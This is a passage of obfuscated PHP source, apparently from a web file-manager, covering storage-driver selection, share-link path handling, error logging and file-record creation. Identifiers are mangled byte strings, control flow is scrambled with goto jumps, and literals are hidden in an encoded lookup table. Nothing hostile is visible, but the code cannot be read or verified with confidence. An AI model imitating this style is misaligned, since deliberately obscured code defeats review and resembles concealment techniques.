Exception($GLOBALS[$eÅ·ãÌì¨‡[1053]][$eÅ·ãÌì¨‡[1054]]); } return $B¡ÙñÔêç±; goto d ˆÖ•³¦; d¨É‡‡£â: if ($B‰ÊİåÛÀ¿ <= 0) { return $eÅ·ãÌì¨‡[33]; } if ($AÓø÷îôÍÕ < 0 || $AÓø÷îôÍÕ >= $bÑÁ…’…¤ || $B‰ÊİåÛÀ¿ > 1024 * 1024 * 5) { throw new Exception("\146\151\154\145\x52\145\x61\x64\40\145\162\162\157\x72\x21\x20\x73\x74\x61\x72\164\75{$AÓø÷îôÍÕ}\x3b\x6c\145\x6e\147\164\150\75{$B‰ÊİåÛÀ¿}\73\40\x73\151\x7a\x65\75{$bÑÁ…’…¤}\x3b"); } $B¡ÙñÔêç± = $E½¼ª„ì–Ş->fileSubstr($bÁ‹¾¿âÂ, $AÓø÷îôÍÕ, $B‰ÊİåÛÀ¿); goto dÄ²ñÌè¤ó; d ˆÖ•³¦: } private static function driverMake(&$eñĞĞù‡ÎÛ) { goto DÎé–‚âîŸ; DÎé–‚âîŸ: $e¸ƒÕµË§ =& $_SERVER[ÒÆ›ÆØÎ¾]; $CòÄï£ = KodIO::parse($eñĞĞù‡ÎÛ); if (!self::$driverListSystem) { $B£ŠÇÕ¬­ = Model($e¸ƒÕµË§[719])->driverListSystem(); self::$driverListSystem = array_to_keyvalue($B£ŠÇÕ¬­, $e¸ƒÕµË§[393]); } goto FğšŒÈÕÒà; f›’å†¼º: return $d§³âËšÉ½; goto cõ¨«¯“Ñ; FğšŒÈÕÒà: if ($CòÄï£[$e¸ƒÕµË§[29]] == KodIO::KOD_IO && !self::$driverListSystem[$CòÄï£[$e¸ƒÕµË§[393]]]) { return !1; } $eñĞĞù‡ÎÛ = $CòÄï£[$e¸ƒÕµË§[1055]]; $d§³âËšÉ½ = self::driverGet($CòÄï£, $eñĞĞù‡ÎÛ); goto f›’å†¼º; cõ¨«¯“Ñ: } private static function driverGet($DØ•„æóç, &$FØ–²ğ­Ì) { goto FïØ¿Ÿñøø; FïØ¿Ÿñøø: $a—Œâº„Œ¨ =& $_SERVER[ÒÆ›ÆØÎ¾]; $C·ö†Åè = $DØ•„æóç[$a—Œâº„Œ¨[1056]]; $e­öå»Ô = $DØ•„æóç[$a—Œâº„Œ¨[393]]; goto cáˆÍö´À; cáˆÍö´À: switch ($DØ•„æóç[$a—Œâº„Œ¨[29]]) { case KodIO::KOD_IO: $F¹ÂÛïš«Û = self::$driverListSystem[$e­öå»Ô]; break; case KodIO::KOD_SOURCE: $FØ–²ğ­Ì = $e­öå»Ô . $FØ–²ğ­Ì; $F¹ÂÛïš«Û = array($a—Œâº„Œ¨[1057] => $a—Œâº„Œ¨[1058], $a—Œâº„Œ¨[6] => $DØ•„æóç); break; case KodIO::KOD_USER_DRIVER: if (!self::$driverListUser) { $EêÔÓÎ¡Ëğ = $GLOBALS[$a—Œâº„Œ¨[1059]]; self::$driverListUser = array_to_keyvalue($EêÔÓÎ¡Ëğ, $a—Œâº„Œ¨[393]); } $F¹ÂÛïš«Û = self::$driverListUser[$e­öå»Ô]; break; case KodIO::KOD_SHARE_LINK: $F¹ÂÛïš«Û = array($a—Œâº„Œ¨[1057] => $a—Œâº„Œ¨[1060], $a—Œâº„Œ¨[6] => $DØ•„æóç); $DÛ’²¡ŠÑŸ = Action($a—Œâº„Œ¨[1061])->sharePathInfo($DØ•„æóç[$a—Œâº„Œ¨[76]]); $FØ–²ğ­Ì = $DÛ’²¡ŠÑŸ[$a—Œâº„Œ¨[395]]; if (!$DÛ’²¡ŠÑŸ[$a—Œâº„Œ¨[395]]) { $E¥á¯Ü¦ê = Model($a—Œâº„Œ¨[563])->getInfo($DÛ’²¡ŠÑŸ[$a—Œâº„Œ¨[468]]); $FØ–²ğ­Ì = KodIO::clear($E¥á¯Ü¦ê[$a—Œâº„Œ¨[1062]] . $DØ•„æóç[$a—Œâº„Œ¨[1055]]); $DØ•„æóç[$a—Œâº„Œ¨[466]] = $E¥á¯Ü¦ê; $DØ•„æóç[$a—Œâº„Œ¨[1039]] = $FØ–²ğ­Ì; $F¹ÂÛïš«Û = array($a—Œâº„Œ¨[1057] => $a—Œâº„Œ¨[1063], $a—Œâº„Œ¨[6] => $DØ•„æóç); } break; case KodIO::KOD_SHARE_ITEM: $F¹ÂÛïš«Û = array($a—Œâº„Œ¨[1057] => $a—Œâº„Œ¨[1064], $a—Œâº„Œ¨[6] => $DØ•„æóç); $E¥á¯Ü¦ê = Model($a—Œâº„Œ¨[563])->getInfo($DØ•„æóç[$a—Œâº„Œ¨[393]]); if ($E¥á¯Ü¦ê[$a—Œâº„Œ¨[395]] == $a—Œâº„Œ¨[191]) { $FØ–²ğ­Ì = KodIO::clear($E¥á¯Ü¦ê[$a—Œâº„Œ¨[1062]] . $DØ•„æóç[$a—Œâº„Œ¨[1055]]); $DØ•„æóç[$a—Œâº„Œ¨[466]] = $E¥á¯Ü¦ê; $DØ•„æóç[$a—Œâº„Œ¨[1039]] = $FØ–²ğ­Ì; $F¹ÂÛïš«Û = array($a—Œâº„Œ¨[1057] => $a—Œâº„Œ¨[1065], $a—Œâº„Œ¨[6] => $DØ•„æóç); } else { if (!$FØ–²ğ­Ì) { $FØ–²ğ­Ì = $E¥á¯Ü¦ê[$a—Œâº„Œ¨[395]]; } } break; default: $FØ–²ğ­Ì = $DØ•„æóç[$a—Œâº„Œ¨[76]]; $F¹ÂÛïš«Û = array($a—Œâº„Œ¨[1057] => $a—Œâº„Œ¨[1066]); break; } $eˆï’ÖéÚÃ = $DØ•„æóç[$a—Œâº„Œ¨[76]]; if (!isset(self::$driverCache[$eˆï’ÖéÚÃ])) { $F‡Æ“É£Ö¯ = strtolower($F¹ÂÛïš«Û[$a—Œâº„Œ¨[94]]); $Dê¸ÄŸ‘‘ê = $GLOBALS[$a—Œâº„Œ¨[6]][$a—Œâº„Œ¨[88]][$a—Œâº„Œ¨[783]]; $d¤ĞĞ”„ÓÎ = $a—Œâº„Œ¨[72] . (isset($Dê¸ÄŸ‘‘ê[$F‡Æ“É£Ö¯]) ? $Dê¸ÄŸ‘‘ê[$F‡Æ“É£Ö¯] : ucfirst($F‡Æ“É£Ö¯)); if (!class_exists($d¤ĞĞ”„ÓÎ)) { show_json("{$d¤ĞĞ”„ÓÎ}\40\x6e\x6f\x74\40\145\x78\151\163\164\x73\41", !1); } $bÁÎÕ¤öÔ‡ = isset($F¹ÂÛïš«Û[$a—Œâº„Œ¨[6]]) ? $F¹ÂÛïš«Û[$a—Œâº„Œ¨[6]] : !1; self::$driverCache[$eˆï’ÖéÚÃ] = new $d¤ĞĞ”„ÓÎ($bÁÎÕ¤öÔ‡); } goto BÕ¼Ù¾Úù; B­™¨Õ¦ƒ‚: $cößš¯¹¤->path = $FØ–²ğ­Ì; return $cößš¯¹¤; goto BùŞˆÖÜÉÌ; f¹ª…áÉãğ: if (isset($F¹ÂÛïš«Û[$a—Œâº„Œ¨[6]][$a—Œâº„Œ¨[1067]])) { $cößš¯¹¤->pathBase = rtrim($F¹ÂÛïš«Û[$a—Œâº„Œ¨[6]][$a—Œâº„Œ¨[1067]], $a—Œâº„Œ¨[8]) . $a—Œâº„Œ¨[8]; $FØ–²ğ­Ì = $cößš¯¹¤->pathBase . ltrim($FØ–²ğ­Ì, $a—Œâº„Œ¨[8]); } $FØ–²ğ­Ì = $cößš¯¹¤->getPath($FØ–²ğ­Ì); if (isset($DØ•„æóç[$a—Œâº„Œ¨[1039]])) { $FØ–²ğ­Ì = $DØ•„æóç[$a—Œâº„Œ¨[1039]]; } goto B­™¨Õ¦ƒ‚; BÕ¼Ù¾Úù: $cößš¯¹¤ = self::$driverCache[$eˆï’ÖéÚÃ]; $cößš¯¹¤->pathDriver = $C·ö†Åè; $cößš¯¹¤->pathBase = $a—Œâº„Œ¨[33]; goto f¹ª…áÉãğ; BùŞˆÖÜÉÌ: } public static function errorTips($f…‘ìé£Ù = false) { goto eƒáæÁ˜šä; b¸Ë§£ö³Ñ: $E§Í˜½ã„à[] = $f…‘ìé£Ù; write_log($A¥àñì¤Ì£[160] . ACTION . $A¥àñì¤Ì£[1068] . $f…‘ìé£Ù, $A¥àñì¤Ì£[1069]); goto AÌ­ÏØ‰İ™; bÑà‘ß¶·™: if ($f…‘ìé£Ù === -1) { return $E§Í˜½ã„à ? $E§Í˜½ã„à[count($E§Í˜½ã„à) - 1] : $A¥àñì¤Ì£[33]; } if ($f…‘ìé£Ù === !1) { return implode($A¥àñì¤Ì£[229], $E§Í˜½ã„à); } if (count($E§Í˜½ã„à) >= $fÀ©‹øƒ˜Û) { $E§Í˜½ã„à = array_slice($E§Í˜½ã„à, $fÀ©‹øƒ˜Û * 0.5, $fÀ©‹øƒ˜Û); } goto b¸Ë§£ö³Ñ; eƒáæÁ˜šä: $A¥àñì¤Ì£ =& $_SERVER[ÒÆ›ÆØÎ¾]; static $E§Í˜½ã„à = array(); $fÀ©‹øƒ˜Û = 1000; goto bÑà‘ß¶·™; AÌ­ÏØ‰İ™: } public static function getLastError($C¨ê¿ª ¨Å = '') { $Fù™‡ó“íè = self::errorTips(-1); return $Fù™‡ó“íè ? $Fù™‡ó“íè : $C¨ê¿ª ¨Å; } } goto C¡Öë‚ê‹; EãøƒÖ„™ñ: define($_SERVER[ÒÆ›ÆØÎ¾][237], 2); define($_SERVER[ÒÆ›ÆØÎ¾][238], 3); define($_SERVER[ÒÆ›ÆØÎ¾][239], 1); goto E»ì‚Í™àÏ; F°ÄâÅ‡¿: class PathDriverDbShareLink extends PathDriverDB { public function __construct($aøŒ™…øˆ) { $this->pathParse = $aøŒ™…øˆ; $this->model = Model($_SERVER[ÒÆ›ÆØÎ¾][1197]); } protected function infoParse($cö›·º…ùˆ, $D´¾²Â¼• = false, $BÙÃĞ…µ… = false) { $cåì‚Ÿ§¸ø =& $_SERVER[ÒÆ›ÆØÎ¾]; return Action($cåì‚Ÿ§¸ø[1061])->sharePathInfo($this->pathParse[$cåì‚Ÿ§¸ø[76]], !0); } public function listPath($BÕ±ãšÊ™©, $e–º‘öŒ‡ = false) { $D˜…Èù›˜² =& $_SERVER[ÒÆ›ÆØÎ¾]; $f•ÀÚ‹ÕÄæ = parent::listPath($BÕ±ãšÊ™©, $e–º‘öŒ‡); foreach ($f•ÀÚ‹ÕÄæ as $AğğñçÚÂ… => $A¢Ú¶éùæ) { if (!in_array($AğğñçÚÂ…, array($D˜…Èù›˜²[74], $D˜…Èù›˜²[75]))) { continue; } foreach ($A¢Ú¶éùæ as $E× ì•ˆØ» => $eÏœªö‹æÅ) { $f•ÀÚ‹ÕÄæ[$AğğñçÚÂ…][$E× ì•ˆØ»] = Action($D˜…Èù›˜²[1061])->shareItemInfo($eÏœªö‹æÅ); } } return $f•ÀÚ‹ÕÄæ; } public function listAll($cĞ´¿ª¥²) { goto Fì«ˆ‡Áæ; B‹Àà˜ì¢…: $b”œÔÈ¯—ª = $this->model->listAll($cĞ´¿ª¥²); foreach ($b”œÔÈ¯—ª as &$A»Êô¨ÕùÇ) { $A»Êô¨ÕùÇ[$dÄÛÕÁØõÍ[85]] = Action($dÄÛÕÁØõÍ[1061])->shareItemInfo($A»Êô¨ÕùÇ[$dÄÛÕÁØõÍ[85]]); } unset($A»Êô¨ÕùÇ); goto d×ùë¡ï; Fì«ˆ‡Áæ: $dÄÛÕÁØõÍ =& $_SERVER[ÒÆ›ÆØÎ¾]; $B¨…é©†ßİ = IO::info($this->pathParse[$dÄÛÕÁØõÍ[76]]); if (!$B¨…é©†ßİ) { return array(); } goto B‹Àà˜ì¢…; d×ùë¡ï: return $b”œÔÈ¯—ª; goto CÆËÕ¿éˆ; CÆËÕ¿éˆ: } } class PathDriverDriverShareItem { public function __construct($C˜…í¯¦ê¿) { $this->pathParse = $C˜…í¯¦ê¿; } public function __call($bšíõ¡ñßÏ, $cğ™®£Õ»™) { $F‡¸Í´­Ğƒ =& $_SERVER[ÒÆ›ÆØÎ¾]; if (method_exists($this, $bšíõ¡ñßÏ)) { return; } $cÈ°ˆ´‡Å = call_user_func_array(array($F‡¸Í´­Ğƒ[1206], $bšíõ¡ñßÏ), $cğ™®£Õ»™); $a ¿åÁ½  = array($F‡¸Í´­Ğƒ[1207], $F‡¸Í´­Ğƒ[1208], $F‡¸Í´­Ğƒ[1209], $F‡¸Í´­Ğƒ[1210], $F‡¸Í´­Ğƒ[518], $F‡¸Í´­Ğƒ[520], $F‡¸Í´­Ğƒ[1211], $F‡¸Í´­Ğƒ[107], $F‡¸Í´­Ğƒ[1212], $F‡¸Í´­Ğƒ[1213]); if (in_array($bšíõ¡ñßÏ, $a ¿åÁ½ )) { $cÈ°ˆ´‡Å = $this->getPathOuter($cÈ°ˆ´‡Å); } return $cÈ°ˆ´‡Å; } public function copy($aô»ï÷ÚÕ, $b·ÈËÜµ­, $bØ·¡£º¸Æ = false) { return $this->copyMove($aô»ï÷ÚÕ, $b·ÈËÜµ­, $bØ·¡£º¸Æ, $_SERVER[ÒÆ›ÆØÎ¾][518]); } public function move($D²ƒ¹¨“§, $A¢ºòÜìÈÈ, $B¼îêÅ¨Ş¾ = false) { return $this->copyMove($D²ƒ¹¨“§, $A¢ºòÜìÈÈ, $B¼îêÅ¨Ş¾, $_SERVER[ÒÆ›ÆØÎ¾][520]); } private function copyMove($DÀèåˆ®†¹, $eá¸ª³‡±£, $d…§Õ¨½ÁÛ, $BñÎËŒ†±) { goto CšˆÎê¾—‡; CšˆÎê¾—‡: $c„œùŞ…Ù‹ =& $_SERVER[ÒÆ›ÆØÎ¾]; $bè¬ÅµÍ¸Ö = $eá¸ª³‡±£; $e‘¸¯ø = IO::driverMake($eá¸ª³‡±£); goto CÆÄ´…ã¢; CÆÄ´…ã¢: if ($e‘¸¯ø->pathParse[$c„œùŞ…Ù‹[1039]]) { $eá¸ª³‡±£ = $e‘¸¯ø->pathParse[$c„œùŞ…Ù‹[1039]]; } else { $eá¸ª³‡±£ = $bè¬ÅµÍ¸Ö; } $Fœ„ò¯¤¡ = IO::copyMove($DÀèåˆ®†¹, $eá¸ª³‡±£, $d…§Õ¨½ÁÛ, $BñÎËŒ†±); $Fœ„ò¯¤¡ = $this->getPathOuter($Fœ„ò¯¤¡); goto e†¿ËØÆÉ; e†¿ËØÆÉ: return $Fœ„ò¯¤¡; goto EÙã¡öé»Æ; EÙã¡öé»Æ: } public function pathThis($C‡’Ö™Ö˜Ò) { return get_path_this($this->pathParse[$_SERVER[ÒÆ›ÆØÎ¾][76]]); } public function pathFather($f½õŸØê¹Ø) { return get_path_father($this->pathParse[$_SERVER[ÒÆ›ÆØÎ¾][76]]); } public function iconvSystem($E•ÍÖ¡é‡¤) { return $E•ÍÖ¡é‡¤; } protected function infoParse($D¦ï³ĞÜä, $F·Š‡ëÕ½ = false) { $e•¿¢¡±å† =& $_SERVER[ÒÆ›ÆØÎ¾]; $DÒ·ˆ¾‚ÃÑ = $this->pathParse[$e•¿¢¡±å†[466]][$e•¿¢¡±å†[1062]] . $this->pathParse[$e•¿¢¡±å†[1055]]; if ($F·Š‡ëÕ½) { $eÈ„³¹‚óë = IO::infoWithChildren($DÒ·ˆ¾‚ÃÑ); } else { $eÈ„³¹‚óë = IO::info($DÒ·ˆ¾‚ÃÑ); } $e„®£İøöé = $this->pathParse[$e•¿¢¡±å†[466]]; return Action($e•¿¢¡±å†[1205])->_shareItemeParse($eÈ„³¹‚óë, $e„®£İøöé); } public function listAll($F¨……öÂ‚”) { $e²æ«¡„›Ì =& $_SERVER[ÒÆ›ÆØÎ¾]; $CĞÌ³ªæƒ– = IO::listAll($F¨……öÂ‚”); $cÍ÷š¬îãà = $this->pathParse[$e²æ«¡„›Ì[466]]; foreach ($CĞÌ³ªæƒ– as &$fˆ’ê‡Ğ‡…) { check_abort(); $e“È‘Ôœƒ = IO::info($fˆ’ê‡Ğ‡…[$e²æ«¡„›Ì[76]]); $e“È‘Ôœƒ = is_array($e“È‘Ôœƒ) ? $e“È‘Ôœƒ : array(); $fˆ’ê‡Ğ‡… = array_merge($e“È‘Ôœƒ, $fˆ’ê‡Ğ‡…); $fˆ’ê‡Ğ‡…[$e²æ«¡„›Ì[85]] = Action($e²æ«¡„›Ì[1205])->_shareItemeParse($fˆ’ê‡Ğ‡…, $cÍ÷š¬îãà); } unset($fˆ’ê‡Ğ‡…); return $CĞÌ³ªæƒ–; } public function getPathOuter($b¬·¸™¼¥š) { goto dœ¦¡²ÜÔµ; DŒ‰ÜË®îœ: if (substr($F›¹°ÒôïŠ, 0, strlen($F¢Æ²ñ¨°)) != $F¢Æ²ñ¨°) { return !1; } return $this->pathParse[$eÉñµ„®Æñ[1056]] . $eÉñµ„®Æñ[8] . ltrim($A™«¨÷ŠĞ, $eÉñµ„®Æñ[8]); goto f·…ç¹©ó÷; dœ¦¡²ÜÔµ: $eÉñµ„®Æñ =& $_SERVER[ÒÆ›ÆØÎ¾]; $C©¤×²¥‡š = KodIO::parse($b¬·¸™¼¥š); if ($C©¤×²¥‡š[$eÉñµ„®Æñ[29]] == KodIO::KOD_SHARE_ITEM) { return $C©¤×²¥‡š[$eÉñµ„®Æñ[76]]; } goto AÕÊæğÕÖé; AÕÊæğÕÖé: $F›¹°ÒôïŠ = KodIO::clear($b¬·¸™¼¥š); $F¢Æ²ñ¨° = KodIO::clear($this->pathParse[$eÉñµ„®Æñ[466]][$eÉñµ„®Æñ[1062]]); $A™«¨÷ŠĞ = substr($F›¹°ÒôïŠ, strlen($F¢Æ²ñ¨°)); goto DŒ‰ÜË®îœ; f·…ç¹©ó÷: } public function getType() { $aÅ„Æ¼‡…Å =& $_SERVER[ÒÆ›ÆØÎ¾]; $FÆ“«ª¦¬¤ = str_replace($aÅ„Æ¼‡…Å[72], $aÅ„Æ¼‡…Å[33], get_class($this)); return strtolower($FÆ“«ª¦¬¤); } public function isTypeObject($fí£¸ÀÅÉ†) { return IO::isTypeObject($fí£¸ÀÅÉ†); } public function info($Eõİ‹‘óª½) { return $this->infoParse($Eõİ‹‘óª½); } public function infoAuth($a”ŒöÏ¡») { return $this->infoParse($a”ŒöÏ¡»); } public function infoWithChildren($eÚ¨‡™ÒŸ) { return $this->infoParse($eÚ¨‡™ÒŸ, !0); } public function infoFull($A–¡éÒ—) { return $this->infoParse($A–¡éÒ—); } } class PathDriverDriverShareLink extends PathDriverDriverShareItem { public function __construct($E›Ãñ‰é¤†) { $this->pathParse = $E›Ãñ‰é¤†; } protected function infoParse($fƒ™ê¼¹Ì, $AáÎ±‘‚˜ğ = false) { $B„•¼Šé—  =& $_SERVER[ÒÆ›ÆØÎ¾]; return Action($B„•¼Šé— [1061])->sharePathInfo($this->pathParse[$B„•¼Šé— [76]], !0, $AáÎ±‘‚˜ğ); } public function listPath($CËØ¶ŒÔÑÙ, $f¾´¡Ş£ª³ = false) { $Aê¤…â°ÚÖ =& $_SERVER[ÒÆ›ÆØÎ¾]; $AÙ…£Â«¹Ğ = IO::listPath($CËØ¶ŒÔÑÙ, $f¾´¡Ş£ª³); foreach ($AÙ…£Â«¹Ğ as $FŠÚ»¼„ì => $FŸùñÃŞ) { if (!in_array($FŠÚ»¼„ì, array($Aê¤…â°ÚÖ[74], $Aê¤…â°ÚÖ[75]))) { continue; } foreach ($FŸùñÃŞ as $B·Á…×¢‚ => $Eíéô¹»ÑÇ) { $Eíéô¹»ÑÇ = Action($Aê¤…â°ÚÖ[1214])->parsePathChildren($Eíéô¹»ÑÇ, array($Aê¤…â°ÚÖ[414] => $CËØ¶ŒÔÑÙ)); $AÙ…£Â«¹Ğ[$FŠÚ»¼„ì][$B·Á…×¢‚] = Action($Aê¤…â°ÚÖ[1061])->shareItemInfo($Eíéô¹»ÑÇ); } } return $AÙ…£Â«¹Ğ; } public function listAll($E±Í•Ë¡êé) { $FˆºÇè¨øò =& $_SERVER[ÒÆ›ÆØÎ¾]; $a°Ë‚«’Ú = IO::listAll($E±Í•Ë¡êé); foreach ($a°Ë‚«’Ú as &$cë´šÖ¾Õ) { $fÁ¥Ì—ëÏ… = IO::info($cë´šÖ¾Õ[$FˆºÇè¨øò[76]]); $fÁ¥Ì—ëÏ… = is_array($fÁ¥Ì—ëÏ…) ? $fÁ¥Ì—ëÏ… : array(); $cë´šÖ¾Õ = array_merge($fÁ¥Ì—ëÏ…, $cë´šÖ¾Õ); $cë´šÖ¾Õ[$FˆºÇè¨øò[85]] = Action($FˆºÇè¨øò[1061])->shareItemInfo($cë´šÖ¾Õ); } unset($cë´šÖ¾Õ); return $a°Ë‚«’Ú; } } goto dŠŠÏÛ«Í; e§ö²¢åœ·: class FileModel extends ModelBase { protected $tableName = "\151\x6f\x5f\x66\x69\154\x65"; protected $tableMeta = array("\x74\141\142\154\145\x4e\x61\155\145" => "\x69\x6f\137\146\x69\154\145\137\155\x65\164\x61", "\155\145\164\141\x46\151\145\154\x64" => "\x66\x69\154\x65\x49\x44"); public function fileInfo($a—ø‡­ï–) { $F»Øˆ Ô‹– =& $_SERVER[ÒÆ›ÆØÎ¾]; static $E‚¢Ç¼ğÁé = array(); if (!isset($E‚¢Ç¼ğÁé[$a—ø‡­ï–])) { $f“õïœÍù„ = $F»Øˆ Ô‹–[1725]; $CöùÂñ¹Š¼ = Model($F»Øˆ Ô‹–[450])->field($f“õïœÍù„)->where(array($F»Øˆ Ô‹–[448] => $a—ø‡­ï–))->find(); $E‚¢Ç¼ğÁé[$a—ø‡­ï–] = $CöùÂñ¹Š¼; } return $E‚¢Ç¼ğÁé[$a—ø‡­ï–]; } public function addFileByContent($bãÒÂŞç“ = '', $EäÂÎÏ™ÊĞ = '') { goto d›Å’†×§; d›Å’†×§: $dŸ£—©¦İè =& $_SERVER[ÒÆ›ÆØÎ¾]; $bß›¾Ë£Ç· = TEMP_PATH . $dŸ£—©¦İè[1726]; if (!is_dir($bß›¾Ë£Ç·)) { mk_dir($bß›¾Ë£Ç·); } goto f«¯˜Êªí; D‰ÃÓ¸É…ô: if (file_exists($C¹Äã¹ÙÊø)) { @unlink($C¹Äã¹ÙÊø); } return $f¹§Ş’Ì¾; goto d±ƒÚãƒ¡Ê; f«¯˜Êªí: $C¹Äã¹ÙÊø = $bß›¾Ë£Ç· . $dŸ£—©¦İè[1727] . rand_string(16); file_put_contents($C¹Äã¹ÙÊø, $bãÒÂŞç“); $f¹§Ş’Ì¾ = $this->addFile($C¹Äã¹ÙÊø, $EäÂÎÏ™ÊĞ, !0); goto D‰ÃÓ¸É…ô; d±ƒÚãƒ¡Ê: } public function createFileName($eŸ×›‚æ»¼, $d„™™§É‰Ğ = false, $d‡ÍøŠëš = false) { goto Eêƒ÷­¯‹’; Eêƒ÷­¯‹’: $B†‡¬¾ïÂ =& $_SERVER[ÒÆ›ÆØÎ¾]; $EÊÏÆ‚é = IO::init($B†‡¬¾ïÂ[8]); $a° •’Í™Õ = $this->makeFilePath($eŸ×›‚æ»¼, $EÊÏÆ‚é, $d„™™§É‰Ğ, $d‡ÍøŠëš); goto F‚‘Œäõœî; E‚˜‘ÑÜÃ³: if (!$DÁ¸ºƒ µ÷ && !Cache::get($C—ƒ£’¬ß)) { $DÁ¸ºƒ µ÷ = !0; $dªˆ­ÌôØ = IO::mkdir($EëÈåïºàË); if (!IO::exist($dªˆ­ÌôØ . $B†‡¬¾ïÂ[753])) { IO::mkfile($dªˆ­ÌôØ . $B†‡¬¾ïÂ[753]); } Cache::set($C—ƒ£’¬ß, 1, 3600 * 2); } return $a° •’Í™Õ; goto aÃ’…ÄÏî±; F‚‘Œäõœî: $EëÈåïºàË = $EÊÏÆ‚é->pathFather($a° •’Í™Õ); static $DÁ¸ºƒ µ÷ = false; $C—ƒ£’¬ß = $B†‡¬¾ïÂ[1728] . md5($EëÈåïºàË); goto E‚˜‘ÑÜÃ³; aÃ’…ÄÏî±: } public function makeFilePath($aâ•ìØµˆ¶, $d±ê‹ß‡ÛÌ, $FµŠ°ôã“ = false, $dÜìˆáÈ¾… = false) { goto D¤¦·ä ªö; Aêäí‚ƒìà: if (!$aâ•ìØµˆ¶) { $C…öùµ¾Ìñ = $b³­ïİ¹Øø[1731]; } switch ($C…öùµ¾Ìñ) { case $b³­ïİ¹Øø[1732]: $a‡°°éÈÊ = $a‡°°éÈÊ . $b³­ïİ¹Øø[95] . $d±ê‹ß‡ÛÌ->ext($aâ•ìØµˆ¶); if ($bïÚ‰ŠÒÃ‡ == $b³­ïİ¹Øø[1671]) { $a‡°°éÈÊ .= $b³­ïİ¹Øø[1419]; } break; case $b³­ïİ¹Øø[1733]: goto F×ÖĞŒôÔí; F×ÖĞŒôÔí: $d†Ïï³¨ = Model($b³­ïİ¹Øø[722])->get($b³­ïİ¹Øø[723]); $b÷Ñ±ğ‡óí = substr(md5($b³­ïİ¹Øø[724] . $d†Ïï³¨ . date($b³­ïİ¹Øø[700])), 0, 8); $c¾˜Õ…Œªê = KodIO::defaultDriver(); goto Ašˆ§¢Ğ…ç; Ašˆ§¢Ğ…ç: $c¦›íÙÇ¹² = $b³­ïİ¹Øø[1114] . $c¾˜Õ…Œªê[$b³­ïİ¹Øø[393]] . $b³­ïİ¹Øø[402] . date($b³­ïİ¹Øø[1734]) . $b÷Ñ±ğ‡óí . $b³­ïİ¹Øø[8]; if ($bïÚ‰ŠÒÃ‡ == $b³­ïİ¹Øø[1671]) { $aâ•ìØµˆ¶ .= $b³­ïİ¹Øø[1419]; } $F×¹Å‰¼§Ø = $b³­ïİ¹Øø[1735] . $c¦›íÙÇ¹² . $aâ•ìØµˆ¶; goto eæéŸÃ†í; eæéŸÃ†í: CacheLock::lock($F×¹Å‰¼§Ø); $a‡°°éÈÊ = $c¦›íÙÇ¹² . $aâ•ìØµˆ¶; if (IO::exist($c¦›íÙÇ¹² . $aâ•ìØµˆ¶)) { $cïóçß‰¿µ = substr($aâ•ìØµˆ¶, 0, strlen($aâ•ìØµˆ¶) - strlen($bïÚ‰ŠÒÃ‡)); $B­êÏÄÓÛ® = $dÜìˆáÈ¾… ? substr($dÜìˆáÈ¾…, 0, 5) : ($FµŠ°ôã“ ? substr($FµŠ°ôã“, 0, 5) : rand_string(5)); $a‡°°éÈÊ = $c¦›íÙÇ¹² . $cïóçß‰¿µ . $B­êÏÄÓÛ® . $b³­ïİ¹Øø[95] . $bïÚ‰ŠÒÃ‡; } goto CÄÖÂ»¹”½; CÄÖÂ»¹”½: if (IO::isTypeObject($a‡°°éÈÊ) && !IO::isUploadServer($a‡°°éÈÊ)) { if (IO::exist($a‡°°éÈÊ)) { return $a‡°°éÈÊ; } $DÆ¢’šî¨Ô = IO::setContent($a‡°°éÈÊ, $b³­ïİ¹Øø[33]); if (!$DÆ¢’šî¨Ô) { show_json($b³­ïİ¹Øø[1736], !1); } } CacheLock::unlock($F×¹Å‰¼§Ø); break; goto DÃ…Ğ¡ä©£; DÃ…Ğ¡ä©£: case $b³­ïİ¹Øø[1731]: break; default: break; } return $a‡°°éÈÊ; goto f¤ÛŠœˆš; f“”·‰Óï: $a‡°°éÈÊ = $c¦›íÙÇ¹² . rand_string(5) . short_id(100); $aâ•ìØµˆ¶ = str_replace($b³­ïİ¹Øø[8], $b³­ïİ¹Øø[71], KodIO::clear($aâ•ìØµˆ¶)); $bïÚ‰ŠÒÃ‡ = $d±ê‹ß‡ÛÌ->ext($aâ•ìØµˆ¶); goto Aêäí‚ƒìà; D¤¦·ä ªö: $b³­ïİ¹Øø =& $_SERVER[ÒÆ›ÆØÎ¾]; $C…öùµ¾Ìñ = Model($b³­ïİ¹Øø[722])->get($b³­ïİ¹Øø[1729]); $c¦›íÙÇ¹² = KodIO::defaultIO() . date($b³­ïİ¹Øø[1730]); goto f“”·‰Óï; f¤ÛŠœˆš: } public function addFileByRemote($f“ŒÇ†øÚ¨, $cïˆïÕİ¿í, $D˜ù¿‡× = array()) { goto AÕÆòÚÉ†; AÕÆòÚÉ†: $AÚ¢¡²Î°Ş =& $_SERVER[ÒÆ›ÆØÎ¾]; if (!IO::exist($f“ŒÇ†øÚ¨)) { return !1; } $e¸—Ò—©ğ = $D˜ù¿‡×[$AÚ¢¡²Î°Ş[170]] ? $D˜ù¿‡×[$AÚ¢¡²Î°Ş[170]] : $AÚ¢¡²Î°Ş[33]; goto D‘ÈôË‹÷¡; dæŠ²“ùäß: if ($fªÛ‚Ô‚ÒÓ = $this->addFileCheckExist($E›äà½ØÉ­[$AÚ¢¡²Î°Ş[171]], $E›äà½ØÉ­[$AÚ¢¡²Î°Ş[170]], $E›äà½ØÉ­[$AÚ¢¡²Î°Ş[78]])) { return $fªÛ‚Ô‚ÒÓ; } return $this->addFileData($E›äà½ØÉ­); goto aä˜¶÷»–; D‘ÈôË‹÷¡: $b‹‰ôÁ½ù½ = IO::hashMd5($f“ŒÇ†øÚ¨, $e¸—Ò—©ğ); $BÄ¹ÛŒÁõ = KodIO::defaultDriver(); $E›äà½ØÉ­ = array($AÚ¢¡²Î°Ş[548] => IO::size($f“ŒÇ†øÚ¨), $AÚ¢¡²Î°Ş[1737] => 1, $AÚ¢¡²Î°Ş[413] => $cïˆïÕİ¿í, $AÚ¢¡²Î°Ş[765] => $BÄ¹ÛŒÁõ[$AÚ¢¡²Î°Ş[393]], $AÚ¢¡²Î°Ş[414] => $f“ŒÇ†øÚ¨, $AÚ¢¡²Î°Ş[1738] => $D˜ù¿‡×[$AÚ¢¡²Î°Ş[171]] ? $D˜ù¿‡×[$AÚ¢¡²Î°Ş[171]] : IO::hashSimple($f“ŒÇ†øÚ¨), $AÚ¢¡²Î°Ş[1739] => $b‹‰ôÁ½ù½ ? $b‹‰ôÁ½ù½ : $e¸—Ò—©ğ); goto dæŠ²“ùäß; aä˜¶÷»–: } private function addFileData($c†ôùæœ‹¡) { 